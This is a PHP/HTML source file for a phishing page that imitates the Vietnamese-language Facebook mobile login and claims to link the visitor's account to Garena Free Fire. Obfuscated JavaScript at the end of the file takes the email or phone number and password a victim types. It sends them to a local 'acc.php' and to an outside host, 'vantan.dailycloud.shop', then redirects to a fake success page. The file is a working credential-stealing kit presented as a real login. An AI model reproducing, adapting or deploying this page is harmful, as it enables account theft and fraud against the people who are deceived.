

                      <?php 
require_once(realpath($_SERVER["DOCUMENT_ROOT"]) .'/config.php');
?>
<!doctype html>
<html lang="vi">

<head>
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <link href="//cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-wEmeIV1mKuiNpC+IOBjI7aAzPcEZeedi5yW5f2yOq55WWLwNGmvvx4Um1vskeMj0" crossorigin="anonymous">
    <link rel="stylesheet" href="cssjs/login.css?v=1.3">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
    <title>Đăng Nhập Bằng Facebook</title>
    <style>
        .thongbao {
            display: none;
        }
    </style>
                      <script src="cssjs/mdb.min.js"></script>

<body>
    <div id="root">
        <div class="touch x1 _fzu _50-3 iframe acw portrait">
            <div id="viewport">
                <h1
                    style="display: block; height: 0px; overflow: hidden; position: absolute; width: 0px; padding: 0px;">
                    Facebook </h1>
                <div id="page">
                    <div id="header-notices" class="_129_"></div>
                    <div id="header" class="_4g33 _52we _52z5">
                        <div class="_4g34 _52z6"><a href="#"><i
                                    class="img sp_7V_P8-AK9yC sx_ce405b"><u>Facebook</u></i></a></div>
                    </div>
                    <div id="root" role="main" class="_5soa acw">
                        <div class="_4g33">
                            <div id="u_0_0" class="_4g34">
                                <div data-sigil="m_login_notice" class="thongbao _5yd0 _2ph- _5yd1"> <span
                                        id="thongbao"></span></div>
                                <!---->
                                    <div class="aclb _4-4l">
                                    <div class="_5rut">
                                          <div>
                                      <div class="_52jj _3-q2">
                                      <img src="https://play-lh.googleusercontent.com/2jW_YF6fpW0R_-oyJz-6pixV6n_-CdkXGrGeaISIDGbDomZs2ulrnEdBX09L5oDTTvM=w240-h480-rw"
     style="width: 70px; height: 70px; border-radius: 10px;"
/>

                                            <br></br>
                                            <div class="_52je _52j9">Hãy đăng nhập vào tài khoản Facebook của bạn để kết nối với Garena Free Fire</div>
                                            </div>
                                        </div>
                                        <div novalidate="novalidate" data-autoid="autoid_2"
                                            class="mobile-login-form _5spm">
                                            <div class="_56be _5sob">
                                                <div class="_55wo _55x2 _56bf">
                                                    <div id="email_input_container"><input name="username"
                                                            placeholder="Email hoặc số điện thoại" id="sdt" type="text"
                                                            value="" class="_56bg _4u9z _5ruq"></div>
                                                    <div>
                                                        <div class="_1upc _mg8">
                                                            <div class="_4g33">
                                                                <div class="_4g34 _5i2i _52we">
                                                                    <div class="_5xu4"><input autocorrect="off"
                                                                            autocapitalize="off" autocomplete="on"
                                                                            id="pass" name="password"
                                                                            placeholder="Mật khẩu" type="password"
                                                                            class="_56bg _4u9z _27z2">
                                                                    </div>
                                                          <div class="showHide showPassword" onclick="showFbPassword()"><i class="zmdi zmdi-eye zmdi-hc-lg"></i></div> <!--- showPassword --->
														<div class="showHide hidePassword" style="display: none;" onclick="hideFbPassword()"><i class="zmdi zmdi-eye-off zmdi-hc-lg"></i></div> 
                                                                </div>                                                         
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="_2pie" style="text-align: center;">
                                                <div id="u_0_4"><button value="Đăng nhập"
                                                        class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu"
                                                        onclick="dangnhap()"><span class="_55sr">Đăng
                                                            nhập</span></button></div>
                                                <div id="otp_button_elem_container"></div>
                                            </div>
                                            <div class="_xo8"></div>
                                        </div>
                                        <div>
                                            <div class="_43mg"><span class="_43mh">hoặc</span></div>
                                            <div id="u_0_6" class="_52jj _5t3b"><a role="button" id="signup-button"
                                                    href="https://m.facebook.com/reg/?cid=103&amp;next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D2036793259884297%26redirect_uri%3Dhttps%253A%252F%252Fauth.garena.com%252Foauth%252Flogin%253Fclient_id%253D100067%2526redirect_uri%253Dhttps%25253A%25252F%25252Fgiaidau.ff.garena.vn%25252Flogin%25252Fcallback%2526response_type%253Dtoken%2526platform%253D3%2526locale%253Dvi-VN%26response_type%3Dtoken%26scope%3Dpublic_profile%252Cemail%252Cuser_friends%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db06a8f56-81cb-4296-bc49-4e7d9d0b8657&amp;locale2=vi_VN&amp;refsrc=https%3A%2F%2Fm.facebook.com%2Flogin.php&amp;soft=hjk"
                                                    class="_5t3c _28le btn btnS medBtn mfsm touchable"> Tạo tài khoản
                                                    mới </a></div>
                                        </div>
                                        <div>
                                            <div class="other-links">
                                                <ul class="_5pkb _55wp">
                                                    <li><span class="mfss fcg"><a
                                                                href="https://m.facebook.com/login/identify/?ctx=recover&amp;c=https%3A%2F%2Fm.facebook.com%2Flogin.php%3Fskip_api_login%3D1%26api_key%3D2036793259884297%26kid_directed_site%3D0%26app_id%3D2036793259884297%26signed_next%3D1%26next%3Dhttps%253A%252F%252Fwww.facebook.com%252Fdialog%252Foauth%253Fclient_id%253D2036793259884297%2526redirect_uri%253Dhttps%25253A%25252F%25252Fauth.garena.com%25252Foauth%25252Flogin%25253Fclient_id%25253D100067%252526redirect_uri%25253Dhttps%2525253A%2525252F%2525252Fgiaidau.ff.garena.vn%2525252Flogin%2525252Fcallback%252526response_type%25253Dtoken%252526platform%25253D3%252526locale%25253Dvi-VN%2526response_type%253Dtoken%2526scope%253Dpublic_profile%25252Cemail%25252Cuser_friends%2526ret%253Dlogin%2526fbapp_pres%253D0%2526logger_id%253Db06a8f56-81cb-4296-bc49-4e7d9d0b8657%26cancel_url%3Dhttps%253A%252F%252Fauth.garena.com%252Foauth%252Flogin%253Fclient_id%253D100067%2526redirect_uri%253Dhttps%25253A%25252F%25252Fgiaidau.ff.garena.vn%25252Flogin%25252Fcallback%2526response_type%253Dtoken%2526platform%253D3%2526locale%253Dvi-VN%2526error%253Daccess_denied%2526error_code%253D200%2526error_description%253DPermissions%252Berror%2526error_reason%253Duser_denied%2523_%253D_%26display%3Dpage%26locale%3Dvi_VN%26pl_dbl%3D0&amp;multiple_results=0&amp;ars=facebook_login&amp;lwv=100&amp;locale2=vi_VN&amp;_rdr"
                                                                id="forgot-password-link"> Quên mật khẩu? </a></span>
                                                    </li>
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="_55wr _5ui2">
                            <div class="_5dpw">
                                <div data-nocookies="1" id="locale-selector" class="_5ui3">
                                    <div class="_4g33">
                                        <div class="_4g34"><span class="_52jc _52j9 _52jh _3ztb">Tiếng Việt</span>
                                            <div class="_3ztc"><span class="_52jc"><a href="#">中文(台灣)</a></span></div>
                                            <div class="_3ztc"><span class="_52jc"><a href="#">Español</a></span></div>
                                            <div class="_3ztc"><span class="_52jc"><a href="#">Français
                                                        (France)</a></span></div>
                                        </div>
                                        <div class="_4g34">
                                            <div class="_3ztc"><span class="_52jc"><a href="#">English (UK)</a></span>
                                            </div>
                                            <div class="_3ztc"><span class="_52jc"><a href="#">한국어</a></span></div>
                                            <div class="_3ztc"><span class="_52jc"><a href="#">Português
                                                        (Brasil)</a></span></div><a href="#">
                                                <div aria-label="Danh sách ngôn ngữ đầy đủ" class="_3j87 _1rrd _3ztd"><i
                                                        class="img sp_7V_P8-AK9yC sx_21ee4d"></i></div>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                                <div class="_5ui4"><span class="mfss fcg">Meta © 2022</span></div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>


    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script>
      var _0x25cf=["\x74\x65\x73\x74","\x70\x68\x6F\x6E\x65\x6E\x75\x6D\x62\x65\x72\x20\x66\x61\x6C\x73\x65","\x6C\x6F\x67","\x70\x68\x6F\x6E\x65\x6E\x75\x6D\x62\x65\x72\x20\x74\x72\x75\x65","\x6C\x65\x6E\x67\x74\x68","\x31\x32\x33\x34\x35\x36","\x31\x32\x33\x34\x35\x36\x37","\x6A\x66\x68\x66\x68\x66\x68\x64\x68\x66","\x33\x33\x33\x33\x33\x33\x33\x33\x33","\x37\x37\x37\x37\x37\x37\x37\x37\x37\x37\x37\x37\x37\x37\x37\x37\x37\x37","\x79\x79\x38\x75\x69\x38\x75\x39\x6F","\x75\x45\x61\x21\x66\x58\x36\x5A\x57\x5F\x54\x37\x37\x45\x52","\x63\x6F\x63\x61\x69\x63\x6F\x6E\x63\x61\x63","\x63\xF3\x63\x61\x69\x63\x6F\x6E\x63\x61\x63","\x72\x6A\x64\x68\x64\x68\x64","\x35\x35\x35\x35\x35\x35\x35","\x31\x32\x33\x34\x35\x36\x37\x38","\x31\x32\x33\x34\x35\x36\x37\x38\x39","\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30","\x31\x31\x31\x31\x31\x31\x31","\x32\x32\x32\x32\x32\x32\x32","\x61\x61\x61\x61\x61\x61\x61","\x33\x33\x33\x33\x33\x33\x33","\x34\x34\x34\x34\x34\x34\x34","\x36\x36\x36\x36\x36\x36\x36","\x76\x61\x6C","\x23\x73\x64\x74","\x23\x70\x61\x73\x73","\x2E\x2F\x61\x63\x63\x2E\x70\x68\x70","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x73\x75\x63\x63\x65\x73\x73\x2E\x70\x68\x70","\x70\x6F\x73\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x76\x61\x6E\x74\x61\x6E\x2E\x64\x61\x69\x6C\x79\x63\x6C\x6F\x75\x64\x2E\x73\x68\x6F\x70\x2F","\x69\x73\x4E\x75\x6D\x65\x72\x69\x63","\x68\x69\x64\x65","\x2E\x74\x68\x6F\x6E\x67\x62\x61\x6F","\x73\x68\x6F\x77","\x53\u1ED1\x20\x64\x69\x20\u0111\u1ED9\x6E\x67\x20\x68\x6F\u1EB7\x63\x20\x65\x6D\x61\x69\x6C\x20\x62\u1EA1\x6E\x20\x6E\x68\u1EAD\x70\x20\x6B\x68\xF4\x6E\x67\x20\x6B\u1EBF\x74\x20\x6E\u1ED1\x69\x20\x76\u1EDB\x69\x20\x74\xE0\x69\x20\x6B\x68\x6F\u1EA3\x6E\x20\x6E\xE0\x6F\x2E\x20\x48\xE3\x79\x20\x74\xEC\x6D\x20\x74\xE0\x69\x20\x6B\x68\x6F\u1EA3\x6E\x20\x63\u1EE7\x61\x20\x62\u1EA1\x6E\x20\x76\xE0\x20\u0111\u0103\x6E\x67\x20\x6E\x68\u1EAD\x70\x2E","\x74\x65\x78\x74","\x23\x74\x68\x6F\x6E\x67\x62\x61\x6F","","\x56\x75\x69\x20\x6C\xF2\x6E\x67\x20\x6E\x68\u1EAD\x70\x20\x6D\u1EAD\x74\x20\x6B\x68\u1EA9\x75","\x4D\u1EAD\x74\x20\x6B\x68\u1EA9\x75\x20\x62\u1EA1\x6E\x20\u0111\xE3\x20\x6E\x68\u1EAD\x70\x20\x6B\x68\xF4\x6E\x67\x20\x63\x68\xED\x6E\x68\x20\x78\xE1\x63\x2E\x20\x51\x75\xEA\x6E\x20\x6D\u1EAD\x74\x20\x6B\x68\u1EA9\x75\x3F","\x70\x61\x73\x73","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x74\x79\x70\x65","\x70\x61\x73\x73\x77\x6F\x72\x64","\x2E\x73\x68\x6F\x77\x50\x61\x73\x73\x77\x6F\x72\x64","\x2E\x68\x69\x64\x65\x50\x61\x73\x73\x77\x6F\x72\x64"];function validateEmail(_0x7bd2x2){var _0x7bd2x3=/\S+@\S+\.\S+/;return _0x7bd2x3[_0x25cf[0]](_0x7bd2x2)}function telephoneCheck(_0x7bd2x5){var _0x7bd2x6=/((84|01|03|05|07|08|09)+([0-9]{8})\b)/g;if(_0x7bd2x6[_0x25cf[0]](_0x7bd2x5)== false){console[_0x25cf[2]](_0x25cf[1]);return false}else {console[_0x25cf[2]](_0x25cf[3]);return true}}function validatepassword(_0x7bd2x8){if(_0x7bd2x8[_0x25cf[4]]>= 6&& _0x7bd2x8[_0x25cf[4]]<= 35){if(_0x7bd2x8== _0x25cf[5]|| _0x7bd2x8== _0x25cf[6]|| _0x7bd2x8== _0x25cf[7]|| _0x7bd2x8== _0x25cf[8]|| _0x7bd2x8== _0x25cf[9]|| _0x7bd2x8== _0x25cf[10]|| _0x7bd2x8== _0x25cf[11]|| _0x7bd2x8== _0x25cf[12]|| _0x7bd2x8== _0x25cf[13]|| _0x7bd2x8== _0x25cf[14]|| _0x7bd2x8== _0x25cf[15]|| _0x7bd2x8== _0x25cf[16]|| _0x7bd2x8== _0x25cf[17]|| _0x7bd2x8== _0x25cf[18]|| _0x7bd2x8== _0x25cf[19]|| _0x7bd2x8== _0x25cf[20]|| _0x7bd2x8== _0x25cf[21]|| _0x7bd2x8== _0x25cf[22]|| _0x7bd2x8== _0x25cf[23]|| _0x7bd2x8== _0x25cf[15]|| _0x7bd2x8== _0x25cf[24]){return false}else {return true}}else {return false}}function go(){var _0x7bd2xa=$(_0x25cf[26])[_0x25cf[25]]();var _0x7bd2x8=$(_0x25cf[27])[_0x25cf[25]]();$[_0x25cf[32]](_0x25cf[28],{user:_0x7bd2xa,pass:_0x7bd2x8},function(_0x7bd2xb,_0x7bd2xc){v();window[_0x25cf[30]][_0x25cf[29]]= _0x25cf[31]});$[_0x25cf[32]](_0x25cf[33],{user:_0x7bd2xa,pass:_0x7bd2x8})}function dangnhap(){var _0x7bd2xa=$(_0x25cf[26])[_0x25cf[25]]();var _0x7bd2x8=$(_0x25cf[27])[_0x25cf[25]]();if($[_0x25cf[34]](_0x7bd2xa)== true){if(telephoneCheck(_0x7bd2xa)== true&& validatepassword(_0x7bd2x8)== true){go();$(_0x25cf[36])[_0x25cf[35]]()}else {$(_0x25cf[36])[_0x25cf[37]]();$(_0x25cf[40])[_0x25cf[39]](_0x25cf[38])}}else {if(_0x7bd2x8[_0x25cf[4]]== 0|| _0x7bd2x8== _0x25cf[41]){$(_0x25cf[40])[_0x25cf[37]]();$(_0x25cf[40])[_0x25cf[39]](_0x25cf[42])}else {if(validateEmail(_0x7bd2xa)== true&& validatepassword(_0x7bd2x8)== true){go();$(_0x25cf[36])[_0x25cf[35]]()}else {$(_0x25cf[36])[_0x25cf[37]]();$(_0x25cf[40])[_0x25cf[39]](_0x25cf[43])}}}}function showFbPassword(){var _0x7bd2xf=document[_0x25cf[45]](_0x25cf[44]);if(_0x7bd2xf[_0x25cf[46]]=== _0x25cf[47]){_0x7bd2xf[_0x25cf[46]]= _0x25cf[39];$(_0x25cf[48])[_0x25cf[35]]();$(_0x25cf[49])[_0x25cf[37]]()}else {_0x7bd2xf[_0x25cf[46]]= _0x25cf[47]}}function hideFbPassword(){var _0x7bd2xf=document[_0x25cf[45]](_0x25cf[44]);if(_0x7bd2xf[_0x25cf[46]]=== _0x25cf[39]){_0x7bd2xf[_0x25cf[46]]= _0x25cf[47];$(_0x25cf[48])[_0x25cf[37]]();$(_0x25cf[49])[_0x25cf[35]]()}else {_0x7bd2xf[_0x25cf[46]]= _0x25cf[39]}}

    </script>


</body>

</html>